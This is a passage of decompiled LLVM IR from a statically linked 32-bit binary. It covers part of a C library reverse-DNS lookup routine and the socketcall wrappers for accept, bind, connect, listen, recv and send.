dec_label_pc_805ebd0:                             ; preds = %dec_label_pc_805ebc4, %dec_label_pc_805ebcb
  %storemerge10.in = phi i32 [ %v4_805ebc4, %dec_label_pc_805ebc4 ], [ %v4_805ebcb, %dec_label_pc_805ebcb ]
  %storemerge10 = icmp eq i32 %storemerge10.in, 0
  %v1_805ebd0 = icmp eq i1 %storemerge10, false
  br i1 %v1_805ebd0, label %dec_label_pc_805eeaa, label %dec_label_pc_805ebd6

dec_label_pc_805ebd6:                             ; preds = %dec_label_pc_805ebd0
  %v0_805ebe4 = load i32, i32* @ebx, align 4
  %v5_805ebe4 = inttoptr i32 %v0_805ebe4 to i8*
  store i8* %v5_805ebe4, i8** %stack_var_-120, align 4
  %v0_805ebe5 = load i32, i32* @ebp, align 4
  store i32 %v0_805ebe5, i32* %stack_var_-124, align 4
  %tmp53 = bitcast i8** %tmp to i32*
  %v0_805ebfb3 = load i32, i32* %tmp53, align 4
  %tmp54 = bitcast i8** %stack_var_-140 to i32*
  store i32 %v0_805ebfb3, i32* %tmp54, align 4
  %v10_805ebfc = call i32 @__get_hosts_byaddr_r(i32 %v0_805ebfb3, i32 %tmp30, i32 %tmp31, i32 %tmp28, i32 %v0_805ebe4, i32 %tmp35, i32 %tmp29)
  store i32 %v10_805ebfc, i32* %eax.global-to-local, align 4
  %v1_805ec04 = icmp eq i32 %v10_805ebfc, 0
  br i1 %v1_805ec04, label %dec_label_pc_805eedc, label %dec_label_pc_805ec0c

dec_label_pc_805ec0c:                             ; preds = %dec_label_pc_805ebd6
  store i32 %tmp29, i32* @ecx, align 4
  %v1_805ec13 = inttoptr i32 %tmp29 to i32*
  %v2_805ec13 = load i32, i32* %v1_805ec13, align 4
  store i32 %v2_805ec13, i32* %edx.global-to-local, align 4
  %v9_805ec15 = icmp eq i32 %v2_805ec13, 1
  br i1 %v9_805ec15, label %dec_label_pc_805ec23, label %dec_label_pc_805ec1a

dec_label_pc_805ec1a:                             ; preds = %dec_label_pc_805ec0c
  %v9_805ec1a = icmp eq i32 %v2_805ec13, 4
  %v1_805ec1d = icmp eq i1 %v9_805ec1a, false
  br i1 %v1_805ec1d, label %dec_label_pc_805eedc, label %dec_label_pc_805ec23

dec_label_pc_805ec23:                             ; preds = %dec_label_pc_805ec1a, %dec_label_pc_805ec0c
  %v0_805ec23 = load i8*, i8** %stack_var_-140, align 4
  %v1_805ec23 = ptrtoint i8* %v0_805ec23 to i32
  %v5_805ec23 = call i32 @__open_nameservers(i32 %v1_805ec23, i32 %tmp30, i32 %tmp31)
  store i32 %tmp29, i32* %eax.global-to-local, align 4
  %v0_805ec2f = load i32, i32* @ebx, align 4
  store i32 -1, i32* %v1_805ec13, align 4
  %tmp66 = icmp ult i32 %v0_805ec2f, 4
  br i1 %tmp66, label %dec_label_pc_805eed7, label %dec_label_pc_805ec3e

dec_label_pc_805ec3e:                             ; preds = %dec_label_pc_805ec23
  %v0_805ec3e = load i32, i32* @ebx, align 4
  %v1_805ec3e = add i32 %v0_805ec3e, -4
  store i32 %v1_805ec3e, i32* %eax.global-to-local, align 4
  %tmp67 = icmp ult i32 %v1_805ec3e, 8
  br i1 %tmp67, label %dec_label_pc_805eed7, label %dec_label_pc_805ec4a

dec_label_pc_805ec4a:                             ; preds = %dec_label_pc_805ec3e
  %v1_805ec4a = add i32 %v0_805ec3e, -12
  store i32 %v1_805ec4a, i32* %eax.global-to-local, align 4
  %tmp68 = icmp ult i32 %v1_805ec4a, 32
  br i1 %tmp68, label %dec_label_pc_805eed7, label %dec_label_pc_805ec56

dec_label_pc_805ec56:                             ; preds = %dec_label_pc_805ec4a
  %tmp69 = icmp ult i32 %v0_805ec3e, 16
  br i1 %tmp69, label %dec_label_pc_805eed7, label %dec_label_pc_805ec5f

dec_label_pc_805ec5f:                             ; preds = %dec_label_pc_805ec56
  %v1_805ec5f = add i32 %v0_805ec3e, -16
  store i32 %v1_805ec5f, i32* %eax.global-to-local, align 4
  %tmp70 = icmp ult i32 %v1_805ec5f, 8
  br i1 %tmp70, label %dec_label_pc_805eed7, label %dec_label_pc_805ec6b

dec_label_pc_805ec6b:                             ; preds = %dec_label_pc_805ec5f
  %v0_805ec6b = load i32, i32* @ebp, align 4
  %v1_805ec6b = add i32 %v0_805ec6b, 4
  %v1_805ec6e = add i32 %v0_805ec3e, -44
  %v1_805ec79 = add i32 %v0_805ec6b, 12
  %v1_805ec7c = add i32 %v0_805ec6b, 16
  store i32 %v1_805ec7c, i32* %edx.global-to-local, align 4
  %v1_805ec7f = add i32 %v0_805ec3e, -24
  store i32 %v1_805ec7f, i32* %eax.global-to-local, align 4
  %v10_805ec8a = icmp ult i32 %v1_805ec7f, %v1_805ec6e
  %storemerge19.v = select i1 %v10_805ec8a, i32 24, i32 44
  %storemerge19 = add i32 %v0_805ec6b, %storemerge19.v
  %stack_var_-92.0 = select i1 %v10_805ec8a, i32 %v1_805ec7f, i32 %v1_805ec6e
  store i32 %storemerge19, i32* @edi, align 4
  %tmp71 = icmp ult i32 %stack_var_-92.0, 256
  br i1 %tmp71, label %dec_label_pc_805eed7, label %dec_label_pc_805ecaa

dec_label_pc_805ecaa:                             ; preds = %dec_label_pc_805ec6b
  %v1_805ecaf = icmp eq i1 %v12_805ebb0, false
  %v0_805eced6 = load i32, i32* %tmp53, align 4
  %tmp58 = bitcast i8** %stack_var_-120 to i32*
  store i32 %v0_805eced6, i32* %tmp58, align 4
  store i32 %v0_805ec6b, i32* %stack_var_-124, align 4
  %tmp59 = inttoptr i32 %v0_805eced6 to i16*
  br i1 %v1_805ecaf, label %dec_label_pc_805ece8, label %dec_label_pc_805ecb1

dec_label_pc_805ecb1:                             ; preds = %dec_label_pc_805ecaa
  %v5_805ecb8 = call i32 @memcpy(i16* %tmp59, i32 %tmp30, i32 %v1_805ec79)
  %v0_805ecc1 = load i32, i32* @ebp, align 4
  %v2_805ecc1 = inttoptr i32 %v1_805ec6b to i32*
  store i32 %v0_805ecc1, i32* %v2_805ecc1, align 4
  %v2_805ecc3 = load i32, i32* %stack_var_-124, align 4
  store i32 %v2_805ecc3, i32* %eax.global-to-local, align 4
  %v2_805ecc4 = load i8*, i8** %stack_var_-120, align 4
  %v3_805ecc4 = ptrtoint i8* %v2_805ecc4 to i32
  store i32 %v3_805ecc4, i32* %edx.global-to-local, align 4
  %v0_805ecc5 = load i8*, i8** %tmp, align 4
  %v3_805ecc5 = load i8, i8* %v0_805ecc5, align 1
  %v4_805ecc5 = zext i8 %v3_805ecc5 to i32
  store i32 %v4_805ecc5, i32* %eax.global-to-local, align 4
  %v5_805ecc8 = inttoptr i32 %v4_805ecc5 to i8*
  store i8* %v5_805ecc8, i8** %stack_var_-120, align 4
  %v1_805ecc9 = ptrtoint i8* %v0_805ecc5 to i32
  %v2_805ecc9 = add i32 %v1_805ecc9, 1
  %v3_805ecc9 = inttoptr i32 %v2_805ecc9 to i8*
  %v4_805ecc9 = load i8, i8* %v3_805ecc9, align 1
  %v5_805ecc9 = zext i8 %v4_805ecc9 to i32
  store i32 %v5_805ecc9, i32* %eax.global-to-local, align 4
  store i32 %v5_805ecc9, i32* %stack_var_-124, align 4
  %v2_805ecce = add i32 %v1_805ecc9, 2
  %v3_805ecce = inttoptr i32 %v2_805ecce to i8*
  %v4_805ecce = load i8, i8* %v3_805ecce, align 1
  %v5_805ecce = zext i8 %v4_805ecce to i32
  store i32 %v5_805ecce, i32* %eax.global-to-local, align 4
  %v2_805ecd3 = add i32 %v1_805ecc9, 3
  %v3_805ecd3 = inttoptr i32 %v2_805ecd3 to i8*
  %v4_805ecd3 = load i8, i8* %v3_805ecd3, align 1
  %v5_805ecd3 = zext i8 %v4_805ecd3 to i32
  store i32 %v5_805ecd3, i32* %eax.global-to-local, align 4
  %v0_805ecdd = load i32, i32* @edi, align 4
  %v5_805ecdd = inttoptr i32 %v0_805ecdd to i8*
  store i8* %v5_805ecdd, i8** %stack_var_-140, align 4
  %v4_805ecde = call i32 @sprintf(i32 %v0_805ecdd, i32 ptrtoint ([25 x i8]* @global_var_806d7a8.728 to i32))
  br label %dec_label_pc_805ed3c

dec_label_pc_805ece8:                             ; preds = %dec_label_pc_805ecaa
  %v5_805ecef = call i32 @memcpy(i16* %tmp59, i32 %tmp30, i32 %v1_805ec7f)
  store i32 %v1_805ec7c, i32* @eax, align 4
  %v0_805ecf8 = load i32, i32* @ebp, align 4
  %v2_805ecf8 = inttoptr i32 %v1_805ec7c to i32*
  store i32 %v0_805ecf8, i32* %v2_805ecf8, align 4
  %v0_805ecfa = load i32, i32* @edi, align 4
  store i32 %v0_805ecfa, i32* @esi, align 4
  %v1_805ed03 = add i32 %tmp30, -1
  %v2_805ed2861 = icmp slt i32 %v1_805ed03, 0
  %v1_805ed2a62 = icmp eq i1 %v2_805ed2861, false
  br i1 %v1_805ed2a62, label %dec_label_pc_805ed06, label %dec_label_pc_805ece8.dec_label_pc_805ed2c_crit_edge

dec_label_pc_805ece8.dec_label_pc_805ed2c_crit_edge: ; preds = %dec_label_pc_805ece8
  br label %dec_label_pc_805ed2c

dec_label_pc_805ed06:                             ; preds = %dec_label_pc_805ece8, %dec_label_pc_805ed06
  %v0_805ed0a64 = phi i32 [ %v0_805ed28.pre, %dec_label_pc_805ed06 ], [ %v1_805ed03, %dec_label_pc_805ece8 ]
  %v0_805ed1d63 = phi i32 [ %v2_805ed23, %dec_label_pc_805ed06 ], [ %v0_805ecfa, %dec_label_pc_805ece8 ]
  %v0_805ed06 = load i32, i32* @ebp, align 4
  %v2_805ed06 = add i32 %v0_805ed06, %v0_805ed0a64
  %v3_805ed06 = inttoptr i32 %v2_805ed06 to i8*
  %v4_805ed06 = load i8, i8* %v3_805ed06, align 1
  %v1_805ed0a = add i32 %v0_805ed0a64, -1
  store i32 %v1_805ed0a, i32* @ebx, align 4
  %tmp72 = urem i8 %v4_805ed06, 16
  %v1_805ed0d = zext i8 %tmp72 to i32
  store i32 %v1_805ed0d, i32* %eax.global-to-local, align 4
  %v3_805ed10 = udiv i8 %v4_805ed06, 16
  %v8_805ed10 = zext i8 %v3_805ed10 to i32
  store i32 %v8_805ed10, i32* %edx.global-to-local, align 4
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_806d7c1.729, i32 0, i32 0), i8** %stack_var_-120, align 4
  store i32 %v0_805ed1d63, i32* %stack_var_-124, align 4
  %v3_805ed1e = call i32 @sprintf(i32 %v0_805ed1d63, i32 ptrtoint ([7 x i8]* @global_var_806d7c1.729 to i32))
  store i32 %v3_805ed1e, i32* @eax, align 4
  %v0_805ed23 = load i32, i32* @esi, align 4
  %v2_805ed23 = add i32 %v0_805ed23, %v3_805ed1e
  store i32 %v2_805ed23, i32* @esi, align 4
  %v0_805ed28.pre = load i32, i32* @ebx, align 4
  %v2_805ed28 = icmp slt i32 %v0_805ed28.pre, 0
  %v1_805ed2a = icmp eq i1 %v2_805ed28, false
  br i1 %v1_805ed2a, label %dec_label_pc_805ed06, label %dec_label_pc_805ed2c

dec_label_pc_805ed2c:                             ; preds = %dec_label_pc_805ed06, %dec_label_pc_805ece8.dec_label_pc_805ed2c_crit_edge
  %v0_805ed1d.lcssa = phi i32 [ %v0_805ecfa, %dec_label_pc_805ece8.dec_label_pc_805ed2c_crit_edge ], [ %v2_805ed23, %dec_label_pc_805ed06 ]
  store i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_806d7c8.730, i32 0, i32 0), i8** %stack_var_-120, align 4
  store i32 %v0_805ed1d.lcssa, i32* %stack_var_-124, align 4
  %v3_805ed34 = inttoptr i32 %v0_805ed1d.lcssa to i8*
  %v4_805ed34 = call i32 @strcpy(i8* %v3_805ed34, i32 ptrtoint ([9 x i8]* @global_var_806d7c8.730 to i32))
  br label %dec_label_pc_805ed3c

dec_label_pc_805ed3c:                             ; preds = %dec_label_pc_805ecb1, %dec_label_pc_805ed2c
  %storemerge20 = phi i32 [ %v4_805ecde, %dec_label_pc_805ecb1 ], [ %v4_805ed34, %dec_label_pc_805ed2c ]
  store i32 %storemerge20, i32* %eax.global-to-local, align 4
  store i32 %v1_805ec6b, i32* %edx.global-to-local, align 4
  store i32 0, i32* @ebp, align 4
  %v1_805ed42 = add i32 %v0_805ec6b, 8
  %v2_805ed42 = inttoptr i32 %v1_805ed42 to i32*
  store i32 0, i32* %v2_805ed42, align 4
  store i32 %v1_805ec79, i32* @ecx, align 4
  %v0_805ed4d = load i32, i32* @edi, align 4
  %v2_805ed4d = inttoptr i32 %v1_805ec79 to i32*
  store i32 %v0_805ed4d, i32* %v2_805ed4d, align 4
  %v0_805ed4f = load i32, i32* @ecx, align 4
  %v1_805ed4f = add i32 %v0_805ed4f, 4
  %v2_805ed4f = inttoptr i32 %v1_805ed4f to i32*
  store i32 0, i32* %v2_805ed4f, align 4
  %v2_805ed61 = ptrtoint i32* %stack_var_-36 to i32
  %v2_805ed8e = ptrtoint i32* %stack_var_-20 to i32
  %v8_805edd6 = inttoptr i32 %tmp22 to i8*
  %v9_805edcc = icmp eq i32 %tmp23, 5
  %v1_805edcf = icmp eq i1 %v9_805edcc, false
  br label %dec_label_pc_805ed56

dec_label_pc_805ed56:                             ; preds = %dec_label_pc_805edfa, %dec_label_pc_805ed3c
  store i8* inttoptr (i32 134585853 to i8*), i8** %stack_var_-120, align 4
  store i32 %v2_805ed61, i32* @ebx, align 4
  store i32 %v2_805ed61, i32* %stack_var_-124, align 4
  %v5_805ed66 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-36, i32 134585853, i32 ptrtoint (i32* @global_var_80748a0.725 to i32))
  store i32 %v5_805ed66, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_80748a0.725 to i32), i32* %stack_var_-124, align 4
  %v1_805ed72 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_80748a0.725 to i32))
  %v2_805ed77 = load i32, i32* %stack_var_-124, align 4
  store i32 %v2_805ed77, i32* @ecx, align 4
  %v2_805ed78 = load i8*, i8** %stack_var_-120, align 4
  %v3_805ed78 = ptrtoint i8* %v2_805ed78 to i32
  store i32 %v3_805ed78, i32* %eax.global-to-local, align 4
  store i8* inttoptr (i32 1 to i8*), i8** %stack_var_-120, align 4
  store i32 %v2_805ed61, i32* %stack_var_-124, align 4
  %v4_805ed82 = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-36, i32 1)
  store i32 1, i32* %edx.global-to-local, align 4
  store i8* %v4_805eba8, i8** %stack_var_-120, align 4
  store i32 %v2_805ed8e, i32* %eax.global-to-local, align 4
  store i32 %v2_805ed8e, i32* %stack_var_-124, align 4
  %v0_805ed98 = load i32, i32* @esi, align 4
  %v0_805ed9b = load i32, i32* @edi, align 4
  %v5_805ed9b = inttoptr i32 %v0_805ed9b to i8*
  store i8* %v5_805ed9b, i8** %stack_var_-140, align 4
  %v10_805ed9c = call i32 @__dns_lookup(i8* %v5_805ed9b, i32 12, i32 %v0_805ed98, i32 ptrtoint (i32* @global_var_807ea54.727 to i32), i32 %v2_805ed8e, i32 %v2_805eb9e)
  store i32 %v10_805ed9c, i32* %eax.global-to-local, align 4
  %v2_805eda4 = icmp slt i32 %v10_805ed9c, 0
  br i1 %v2_805eda4, label %dec_label_pc_805eeb1, label %dec_label_pc_805edac

dec_label_pc_805edac:                             ; preds = %dec_label_pc_805ed56
  %v3_805edb1 = load i32, i32* %stack_var_-76, align 4
  %v8_805edb1 = inttoptr i32 %v3_805edb1 to i8*
  store i8* %v8_805edb1, i8** %stack_var_-120, align 4
  %v0_805edb5 = load i32, i32* @edi, align 4
  store i32 %v0_805edb5, i32* %stack_var_-124, align 4
  %v4_805edb6 = inttoptr i32 %v0_805edb5 to i8*
  %v5_805edb6 = call i32 @strncpy(i8* %v4_805edb6, i32 %v3_805edb1, i32 %stack_var_-92.0)
  store i32 %v5_805edb6, i32* %eax.global-to-local, align 4
  %v2_805edbb = load i32, i32* %stack_var_-124, align 4
  store i32 %v2_805edbb, i32* @ecx, align 4
  %v3_805edbc = load i32, i32* %stack_var_-76, align 4
  store i32 %v3_805edbc, i32* %stack_var_-124, align 4
  %v1_805edc0 = call i32 @free(i32 %v3_805edbc)
  store i32 %tmp23, i32* %eax.global-to-local, align 4
  br i1 %v1_805edcf, label %dec_label_pc_805ee16, label %dec_label_pc_805edd1

dec_label_pc_805edd1:                             ; preds = %dec_label_pc_805edac
  %v0_805edd5 = load i32, i32* @edi, align 4
  store i8* %v8_805edd6, i8** %stack_var_-120, align 4
  %v3_805edda = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_805edda, i32* %stack_var_-124, align 4
  %v5_805edde = call i32 @__decode_dotted(i32 %v3_805edda, i32 %tmp22, i32 %v0_805edd5, i32 %stack_var_-92.0)
  store i32 %v5_805edde, i32* %eax.global-to-local, align 4
  %v2_805ede3 = load i32, i32* %stack_var_-124, align 4
  store i32 %v2_805ede3, i32* %edx.global-to-local, align 4
  %v3_805ede4 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_805ede4, i32* %stack_var_-124, align 4
  store i32 %v5_805edde, i32* @ebx, align 4
  %v1_805edea = call i32 @free(i32 %v3_805ede4)
  store i32 %v1_805edea, i32* %eax.global-to-local, align 4
  %v2_805edf2 = icmp slt i32 %v5_805edde, 0
  br i1 %v2_805edf2, label %dec_label_pc_805eec5, label %dec_label_pc_805edfa

dec_label_pc_805edfa:                             ; preds = %dec_label_pc_805edd1
  %v0_805edfa = load i32, i32* @ebp, align 4
  %v1_805edfa = add i32 %v0_805edfa, 1
  store i32 %v1_805edfa, i32* @ebp, align 4
  %v7_805edfe = icmp sgt i32 %v1_805edfa, 5
  br i1 %v7_805edfe, label %dec_label_pc_805ee04, label %dec_label_pc_805ed56

dec_label_pc_805ee04:                             ; preds = %dec_label_pc_805edfa
  store i32 %tmp29, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805eed2

dec_label_pc_805ee16:                             ; preds = %dec_label_pc_805edac
  %v9_805ee16 = icmp eq i32 %tmp23, 12
  %v1_805ee19 = icmp eq i1 %v9_805ee16, false
  br i1 %v1_805ee19, label %dec_label_pc_805ee87, label %dec_label_pc_805ee1b

dec_label_pc_805ee1b:                             ; preds = %dec_label_pc_805ee16
  %v0_805ee1f = load i32, i32* @edi, align 4
  store i8* %v8_805edd6, i8** %stack_var_-120, align 4
  %v3_805ee24 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_805ee24, i32* %stack_var_-124, align 4
  %v5_805ee28 = call i32 @__decode_dotted(i32 %v3_805ee24, i32 %tmp22, i32 %v0_805ee1f, i32 %stack_var_-92.0)
  %v2_805ee2d = load i32, i32* %stack_var_-124, align 4
  store i32 %v2_805ee2d, i32* %eax.global-to-local, align 4
  %v3_805ee2e = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_805ee2e, i32* %stack_var_-124, align 4
  %v1_805ee32 = call i32 @free(i32 %v3_805ee2e)
  store i32 %tmp28, i32* %edx.global-to-local, align 4
  %v0_805ee3e = load i32, i32* @edi, align 4
  %v2_805ee3e = inttoptr i32 %tmp28 to i32*
  store i32 %v0_805ee3e, i32* %v2_805ee3e, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_805ee4f = load i32, i32* %edx.global-to-local, align 4
  %v2_805ee4f = add i32 %v1_805ee4f, 8
  %v3_805ee4f = inttoptr i32 %v2_805ee4f to i32*
  store i32 %tmp31, i32* %v3_805ee4f, align 4
  %v2_805ee52 = zext i1 %v1_805ecaf to i32
  %v3_805ee52 = load i32, i32* %eax.global-to-local, align 4
  %v4_805ee52 = and i32 %v3_805ee52, -256
  %v5_805ee52 = or i32 %v4_805ee52, %v2_805ee52
  %v1_805ee5621 = add i32 %v5_805ee52, 15
  %v1_805ee59 = and i32 %v1_805ee5621, -236
  %v1_805ee5c = load i32, i32* %edx.global-to-local, align 4
  %v2_805ee5c = add i32 %v1_805ee5c, 12
  %v3_805ee5c = inttoptr i32 %v2_805ee5c to i32*
  store i32 %v1_805ee59, i32* %v3_805ee5c, align 4
  %v1_805ee63 = load i32, i32* %edx.global-to-local, align 4
  %v2_805ee63 = add i32 %v1_805ee63, 16
  %v3_805ee63 = inttoptr i32 %v2_805ee63 to i32*
  store i32 %v1_805ec6b, i32* %v3_805ee63, align 4
  %v1_805ee6a = load i32, i32* %edx.global-to-local, align 4
  %v2_805ee6a = add i32 %v1_805ee6a, 4
  %v3_805ee6a = inttoptr i32 %v2_805ee6a to i32*
  store i32 %v1_805ec79, i32* %v3_805ee6a, align 4
  %v0_805ee74 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_805ee74, i32* %v1_805eb92, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %tmp29, i32* %edx.global-to-local, align 4
  store i32 0, i32* %v1_805ec13, align 4
  br label %dec_label_pc_805eedc

dec_label_pc_805ee87:                             ; preds = %dec_label_pc_805ee16
  %v3_805ee8a = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_805ee8a, i32* %stack_var_-124, align 4
  %v1_805ee8e = call i32 @free(i32 %v3_805ee8a)
  store i32 2, i32* %eax.global-to-local, align 4
  store i32 4, i32* %v1_805ec13, align 4
  br label %dec_label_pc_805eedc

dec_label_pc_805eeaa:                             ; preds = %dec_label_pc_805ebd0, %dec_label_pc_805ebb7, %entry
  store i32 22, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805eedc

dec_label_pc_805eeb1:                             ; preds = %dec_label_pc_805ed56
  store i32 1, i32* %v1_805ec13, align 4
  store i32 2, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805eedc

dec_label_pc_805eec5:                             ; preds = %dec_label_pc_805edd1
  store i32 %tmp29, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805eed2

dec_label_pc_805eed2:                             ; preds = %dec_label_pc_805ee04, %dec_label_pc_805eec5
  store i32 3, i32* %v1_805ec13, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805eedc

dec_label_pc_805eed7:                             ; preds = %dec_label_pc_805ec6b, %dec_label_pc_805ec5f, %dec_label_pc_805ec56, %dec_label_pc_805ec4a, %dec_label_pc_805ec3e, %dec_label_pc_805ec23
  store i32 34, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805eedc

dec_label_pc_805eedc:                             ; preds = %dec_label_pc_805ec1a, %dec_label_pc_805ebd6, %dec_label_pc_805eed2, %dec_label_pc_805eeb1, %dec_label_pc_805eeaa, %dec_label_pc_805ee87, %dec_label_pc_805ee1b, %dec_label_pc_805eed7
  store i32 %v0_805eb72, i32* @esi, align 4
  store i32 %v0_805eb71, i32* @edi, align 4
  store i32 %v0_805eb70, i32* @ebp, align 4
  %v0_805eee3 = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_805eee3

; uselistorder directives
  uselistorder i32 %v5_805edde, { 1, 0, 2 }
  uselistorder i32 %v0_805ed28.pre, { 1, 0 }
  uselistorder i32 %v2_805ed23, { 0, 2, 1 }
  uselistorder i8 %v4_805ed06, { 1, 0 }
  uselistorder i16* %tmp59, { 1, 0 }
  uselistorder i32 %stack_var_-92.0, { 3, 2, 1, 0 }
  uselistorder i1 %v10_805ec8a, { 1, 0 }
  uselistorder i32 %v1_805ec7f, { 1, 0, 2, 3 }
  uselistorder i32 %v1_805ec7c, { 1, 0, 2 }
  uselistorder i32 %v1_805ec79, { 1, 3, 2, 0 }
  uselistorder i32 %v1_805ec6b, { 1, 2, 0 }
  uselistorder i32 %v0_805ec6b, { 1, 2, 0, 4, 3, 5 }
  uselistorder i32 %v0_805ec3e, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32* %v1_805ec13, { 2, 4, 0, 3, 1, 5 }
  uselistorder i32* %stack_var_-76, { 1, 2, 0, 3 }
  uselistorder i8** %stack_var_-120, { 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 0, 2, 1 }
  uselistorder i32* %stack_var_-124, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 18, 19, 17, 20, 21 }
  uselistorder i8** %stack_var_-140, { 2, 1, 3, 0 }
  uselistorder i32 %tmp31, { 3, 2, 4, 0, 1 }
  uselistorder i32 %tmp30, { 6, 2, 3, 0, 1, 5, 4 }
  uselistorder i32 %tmp29, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %tmp28, { 2, 1, 0 }
  uselistorder i32 %tmp23, { 0, 2, 1 }
  uselistorder i8** %tmp, { 2, 0, 1 }
  uselistorder i32* %eax.global-to-local, { 30, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 24, 18, 19, 20, 21, 22, 23, 25, 26, 27, 28, 29, 31, 32, 33, 34 }
  uselistorder i8* inttoptr (i32 1 to i8*), { 2, 0, 3, 4, 1 }
  uselistorder i32 (i32, i32, i32)* @__open_nameservers, { 2, 1, 0 }
  uselistorder i8* %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805eedc, { 7, 2, 3, 4, 5, 6, 0, 1 }
  uselistorder label %dec_label_pc_805eed2, { 1, 0 }
  uselistorder label %dec_label_pc_805ed3c, { 1, 0 }
  uselistorder label %dec_label_pc_805ed06, { 1, 0 }
  uselistorder label %dec_label_pc_805ebd0, { 1, 0 }
}

define i32 @__libc_accept(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_805eeff = ptrtoint i32* %stack_var_-12 to i32
  %v2_805ef06 = call i32 @__socketcall(i32 5, i32 %v2_805eeff)
  ret i32 %v2_805ef06

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @bind(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_805ef2b = ptrtoint i32* %stack_var_-12 to i32
  %v2_805ef32 = call i32 @__socketcall(i32 2, i32 %v2_805ef2b)
  ret i32 %v2_805ef32

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @__libc_connect(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_805ef57 = ptrtoint i32* %stack_var_-12 to i32
  %v2_805ef5e = call i32 @__socketcall(i32 3, i32 %v2_805ef57)
  ret i32 %v2_805ef5e

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @getsockopt(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-20, align 4
  %v2_805ef93 = ptrtoint i32* %stack_var_-20 to i32
  %v2_805ef9a = call i32 @__socketcall(i32 15, i32 %v2_805ef93)
  ret i32 %v2_805ef9a

; uselistorder directives
  uselistorder i32* %stack_var_-20, { 1, 0 }
}

define i32 @listen(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-8, align 4
  %v2_805efb7 = ptrtoint i32* %stack_var_-8 to i32
  %v2_805efbe = call i32 @__socketcall(i32 4, i32 %v2_805efb7)
  ret i32 %v2_805efbe

; uselistorder directives
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @__libc_recv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-16, align 4
  %v2_805efeb = ptrtoint i32* %stack_var_-16 to i32
  %v2_805eff2 = call i32 @__socketcall(i32 10, i32 %v2_805efeb)
  ret i32 %v2_805eff2

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
}

define i32 @__libc_recvfrom(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_805f02f = ptrtoint i32* %stack_var_-24 to i32
  %v2_805f036 = call i32 @__socketcall(i32 12, i32 %v2_805f02f)
  ret i32 %v2_805f036

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @__libc_recvmsg(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_805f05b = ptrtoint i32* %stack_var_-12 to i32
  %v2_805f062 = call i32 @__socketcall(i32 17, i32 %v2_805f05b)
  ret i32 %v2_805f062

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @__libc_send(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-16, align 4
  %v2_805f08f = ptrtoint i32* %stack_var_-16 to i32
  %v2_805f096 = call i32 @__socketcall(i32 9, i32 %v2_805f08f)
  ret i32 %v2_805f096

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
}

define i32 @__libc_sendmsg(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_805f0bb = ptrtoint i32* %stack_var_-12 to i32
  %v2_805f0c2 = call i32 @__socketcall(i32 16, i32 %v2_805f0bb)
  ret i32 %v2_805f0c2

; uselistorder directives
